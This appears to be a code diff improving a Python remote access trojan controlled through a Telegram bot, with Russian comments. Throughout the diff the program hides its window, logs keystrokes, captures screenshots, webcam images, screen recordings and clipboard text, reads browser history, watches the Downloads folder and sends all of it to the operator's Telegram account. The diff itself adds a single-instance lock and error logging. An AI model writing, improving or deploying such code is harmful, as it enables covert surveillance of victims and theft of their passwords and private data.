@@ -20,7 +20,28 @@ import cv2
 import numpy as np
 
 # ────────────────────────────────────────────────
-# Логи + скрытие окна (Windows)
+# ЗАЩИТА ОТ ДВУХ ЭКЗЕМПЛЯРОВ (решает ошибку 409)
+# ────────────────────────────────────────────────
+
+LOCK_FILE = "tgrat.lock"
+
+def acquire_lock():
+    try:
+        lock = open(LOCK_FILE, "w")
+        # Для Windows используем простой способ (fcntl не всегда есть)
+        if os.name == 'nt':
+            import msvcrt
+            msvcrt.locking(lock.fileno(), msvcrt.LK_NBLCK, 1)
+        else:
+            import fcntl
+            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        return lock
+    except:
+        print("Другая копия бота уже запущена! Выход.")
+        sys.exit(1)
+
+# ────────────────────────────────────────────────
+# ЛОГИ + скрытие окна + запись ошибок
 # ────────────────────────────────────────────────
 
 logging.basicConfig(
@@ -31,6 +52,12 @@ logging.basicConfig(
         logging.StreamHandler(sys.stdout)
     ]
 )
+
+def log_error(msg):
+    with open("tgrat_errors.log", "a", encoding="utf-8") as f:
+        f.write(f"[{datetime.datetime.now()}] {msg}\n")
+        import traceback
+        f.write(traceback.format_exc() + "\n\n")
 
 if sys.platform.startswith("win"):
     import ctypes
@@ -52,16 +79,12 @@ keylog_lock = threading.Lock()
 screenrec_active = False
 screenrec_filename = "screenrec.mp4"
 
-# Последние проверенные файлы в Downloads (для замены watchdog)
-last_downloads_files = set()
-
 # ────────────────────────────────────────────────
-# Кейлоггер (без файла на диске — сразу в чат)
+# Кейлоггер (в память + отправка в чат)
 # ────────────────────────────────────────────────
 
 def on_press(key):
-    if not keylog_active:
-        return
+    if not keylog_active: return
     try:
         char = key.char if hasattr(key, 'char') and key.char else f' [{key.name.upper() if hasattr(key, "name") else str(key)}] '
         if key == Key.space: char = ' [SPACE] '
@@ -71,54 +94,53 @@ def on_press(key):
         with keylog_lock:
             keylog_lines.append(f"{ts} | {char}")
     except Exception as e:
-        logging.error(f"Keylog error: {e}")
+        log_error(f"Keylog error: {e}")
 
-def send_keylog_to_bot():
+def send_keylog():
     with keylog_lock:
-        if not keylog_lines:
-            return
+        if not keylog_lines: return
         text = "\n".join(keylog_lines[-300:])
-        if len(text) > 3900:
-            text = text[-3900:] + "\n... (обрезано)"
+        if len(text) > 3900: text = text[-3900:] + "\n... (обрезано)"
         try:
-            bot.send_message(ADMIN_ID, f"⌨️ Кейлог (последние нажатия):\n```\n{text}\n```", parse_mode="Markdown")
+            bot.send_message(ADMIN_ID, f"⌨️ Кейлог:\n```\n{text}\n```", parse_mode="Markdown")
             keylog_lines.clear()
         except Exception as e:
-            logging.error(f"Send keylog error: {e}")
+            log_error(f"Send keylog error: {e}")
 
 def auto_send_keylog():
     while True:
         time.sleep(90)
         if keylog_active:
-            send_keylog_to_bot()
+            send_keylog()
 
 # ────────────────────────────────────────────────
-# Простая замена watchdog — проверка новых файлов в Downloads
+# Проверка новых файлов в Downloads (замена watchdog)
 # ────────────────────────────────────────────────
+
+last_downloads = set()
 
 def check_downloads():
-    global last_downloads_files
-    downloads_path = os.path.expanduser("\~/Downloads")
-    if not os.path.exists(downloads_path):
-        return
-    current_files = set(os.listdir(downloads_path))
-    new_files = current_files - last_downloads_files
-    for file in new_files:
-        if file.startswith('.'): continue  # скрытые файлы игнорим
-        full_path = os.path.join(downloads_path, file)
-        bot.send_message(ADMIN_ID, f"🆕 Новый файл в Downloads: {full_path}")
-    last_downloads_files = current_files
+    global last_downloads
+    path = os.path.expanduser("\~/Downloads")
+    if not os.path.exists(path): return
+    current = set(os.listdir(path))
+    new = current - last_downloads
+    for f in new:
+        if not f.startswith('.'):
+            full = os.path.join(path, f)
+            bot.send_message(ADMIN_ID, f"🆕 Новый файл в Downloads:\n{full}")
+    last_downloads = current
 
 def auto_check_downloads():
     while True:
-        time.sleep(60)  # каждую минуту
+        time.sleep(60)
         check_downloads()
 
 # ────────────────────────────────────────────────
 # Браузерная история (Chrome + Yandex + Opera + Firefox)
 # ────────────────────────────────────────────────
 
-def get_browser_history(browser="chrome", limit=12):
+def get_browser_history(browser="chrome", limit=10):
     paths = {
         "chrome": r"\~\AppData\Local\Google\Chrome\User Data\Default\History",
         "yandex": r"\~\AppData\Local\Yandex\YandexBrowser\User Data\Default\History",
@@ -173,17 +195,17 @@ def get_browser_history(browser="chrome", limit=12):
 
 def get_sysinfo():
     try:
-        public_ip = subprocess.getoutput("curl -s ifconfig.me").strip() or "не удалось"
+        ip = subprocess.getoutput("curl -s ifconfig.me").strip() or "не удалось"
     except:
-        public_ip = "не удалось"
+        ip = "не удалось"
     return f"""🖥 ОС: {platform.system()} {platform.release()}
 👤 Пользователь: {os.getlogin()}
 ⚙️ CPU: {platform.processor()}
 🧠 RAM: {round(psutil.virtual_memory().total / (1024**3), 1)} GB
-🌐 IP внешний: {public_ip}"""
+🌐 IP внешний: {ip}"""
 
 # ────────────────────────────────────────────────
-# Меню БЕЗ watchdog и без цветов
+# Меню
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['start', 'help'])
@@ -216,7 +238,7 @@ def is_admin(uid):
     return uid == ADMIN_ID
 
 # ────────────────────────────────────────────────
-# Команды
+# Команды (все с защитой от ошибок)
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['screenshot'])
@@ -229,7 +251,8 @@ def cmd_screenshot(message):
             bot.send_photo(message.chat.id, f, caption="📸 Скриншот")
         os.remove(path)
     except Exception as e:
-        bot.reply_to(message, f"❌ {e}")
+        log_error(f"Screenshot error: {e}")
+        bot.reply_to(message, f"❌ Ошибка скриншота: {str(e)}")
 
 @bot.message_handler(commands=['webcam'])
 def cmd_webcam(message):
@@ -247,7 +270,8 @@ def cmd_webcam(message):
             bot.send_photo(message.chat.id, f, caption="📷 Веб-камера")
         os.remove(path)
     except Exception as e:
-        bot.reply_to(message, f"❌ {e}")
+        log_error(f"Webcam error: {e}")
+        bot.reply_to(message, f"❌ Ошибка вебки: {str(e)}")
 
 @bot.message_handler(commands=['screenrec_start'])
 def cmd_screenrec_start(message):
@@ -278,7 +302,7 @@ def record_screen(duration):
                 bot.send_video(ADMIN_ID, v, caption=f"🎥 Запись завершена ({duration} сек)")
             os.remove(screenrec_filename)
     except Exception as e:
-        logging.error(f"Screen rec error: {e}")
+        log_error(f"Screen rec error: {e}")
     finally:
         screenrec_active = False
 
@@ -308,13 +332,13 @@ def cmd_keylog_stop(message):
         bot.reply_to(message, "Кейлоггер не активен")
         return
     keylog_active = False
-    send_keylog_to_bot()
+    send_keylog()
     bot.reply_to(message, "⌨️ Кейлоггер остановлен и лог отправлен")
 
 @bot.message_handler(commands=['keylog_get'])
 def cmd_keylog_get(message):
     if not is_admin(message.from_user.id): return
-    send_keylog_to_bot()
+    send_keylog()
 
 @bot.message_handler(commands=['clip'])
 def cmd_clip(message):
@@ -324,6 +348,7 @@ def cmd_clip(message):
         text = pyperclip.paste()
         bot.reply_to(message, f"📋 Буфер обмена:\n{text[:3500]}")
     except Exception as e:
+        log_error(f"Clip error: {e}")
         bot.reply_to(message, f"❌ {e}")
 
 @bot.message_handler(commands=['browser_all'])
@@ -367,6 +392,7 @@ def cmd_files(message):
             text = text[:3700] + "\n... (обрезано)"
         bot.reply_to(message, f"📂 Файлы в {path}:\n```\n{text}\n```", parse_mode="Markdown")
     except Exception as e:
+        log_error(f"Files error: {e}")
         bot.reply_to(message, f"❌ {e}")
 
 @bot.message_handler(commands=['status'])
@@ -385,10 +411,13 @@ def cmd_restart(message):
 # ────────────────────────────────────────────────
 
 if __name__ == '__main__':
+    lock = acquire_lock()  # Защита от двойного запуска
+
     logging.info("=== RAT ЗАПУЩЕН ===")
+
     threading.Thread(target=auto_send_keylog, daemon=True).start()
     threading.Thread(target=lambda: KeyboardListener(on_press=on_press).join(), daemon=True).start()
-    threading.Thread(target=auto_check_downloads, daemon=True).start()  # новая проверка Downloads
+    threading.Thread(target=auto_check_downloads, daemon=True).start()
 
     while True:
         try:
